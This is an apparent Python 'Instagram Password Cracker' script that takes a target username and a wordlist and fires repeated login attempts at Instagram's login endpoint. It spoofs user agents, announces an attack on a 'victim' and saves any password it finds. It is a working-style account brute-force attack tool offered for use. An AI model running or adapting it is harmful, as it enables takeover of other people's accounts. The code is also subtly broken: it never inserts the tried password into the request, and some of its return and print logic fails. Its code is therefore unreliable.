import os
import time
import random
import json
import argparse
import requests
import threading
from datetime import datetime
from fake_user_agents import fake_agent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"

payload = {
    "queryParams": {},
    "optIntoOneTap": "false"
}

login_header = {
    "User-Agent": fake_agent(),
    "X-Requested-With": "XMLHttpRequest",
    "Referer": instagram_url
}

# Function to print colored output
def print_color(text, color):
    colors = {
        "green": "\033[92m",
        "blue": "\033[94m",
        "red": "\033[91m",
        "yellow": "\033[93m",
        "reset": "\033[00m"
    }
    print(f"{colors[color]}{text}{colors['reset']}")

def attack_start_notify(target):
    print_color(f"Starting attack to victim: {target}", "blue")

def attack_hack_notify(hack, speed):
    print_color(f"[+] Target password found: {hack}", "yellow")
    print(f"[*] Typing speed: {speed} attempts per minute")

def crack(session, password, victim, start_time, tryes, csrf_token):
    payload["queryParams"]["enc_password"] = f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{csrf_token}"
    hack_request = session.post(instagram_url_login, data=payload, headers=login_header)
    threading.Thread(target=attack_start_notify, args=(victim,)).start()
    print(f"[-] Trying password: {password}")
    try:
        hack_data = json.loads(hack_request.text)
    except json.JSONDecodeError:
        print_color("[-] Invalid response from the server. Retrying...", "red")
        return {"authenticated": False}
    print(f'[{print_color("INFO", "green")}]: {hack_data}')
    time_taken = (time.time() - start_time) / 60  # Calculate time taken in minutes
    speed = tryes / time_taken
    return hack_data, speed

def attack(target, wordlist_file, save, speed, csrf_token):
    tryes = 0
    start_time = time.time()
    session = requests.Session()
    delay = 60 / speed  # Calculate delay between each password attempt
    for hack in wordlist_file:
        tryes += 1
        hack = hack.strip()
        try:
            hack_data, speed = crack(session, hack, target, start_time, tryes, csrf_token)
            if "authenticated" in hack_data and hack_data["authenticated"]:
                threading.Thread(target=attack_hack_notify, args=(hack, speed)).start()
                with open(f"hacked/{hack}", "a") as hacked:
                    hacked.write(hack)
                break
        except KeyError:
            time.sleep(2)
            print_color("[-] Instagram detected spam attack", "red")
            hack_data = {"authenticated": False}

        time.sleep(delay)  # Delay between each password attempt

def main(config):
    target = config.get("target")
    wordlist_file = config.get("wordlist")
    save = config.get("save")
    speed = config.get("speed")
    csrf_token = config.get("csrf_token")

    if not target or not wordlist_file:
        print_color("[-] Missing target or wordlist file in the config", "red")
        return

    if not os.path.isfile(wordlist_file):
        print_color(f"[-] Wordlist file '{wordlist_file}' does not exist", "red")
        return

    wordlist = open(wordlist_file, "r").readlines()

    session = requests.Session()
    session.headers.update(login_header)

    payload["queryParams"]["next"] = f"/{target}/"
    payload["queryParams"]["username"] = target
    payload["queryParams"]["password"] = ""

    # Set the CSRF token from the config or print an error message
    if csrf_token:
        attack(target, wordlist, save, speed, csrf_token)
    else:
        print_color("[-] CSRF token is missing in the config", "red")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Instagram Password Cracker")
    parser.add_argument("-c", "--config", help="Config file path")
    args = parser.parse_args()

    if not args.config:
        parser.print_help()
        exit()

    config_file = args.config
    if not os.path.isfile(config_file):
        print_color(f"[-] Config file '{config_file}' does not exist", "red")
        exit()

    with open(config_file, "r") as f:
        try:
            config = json.load(f)
        except json.JSONDecodeError:
            print_color("[-] Invalid config file format", "red")
            exit()

    main(config)
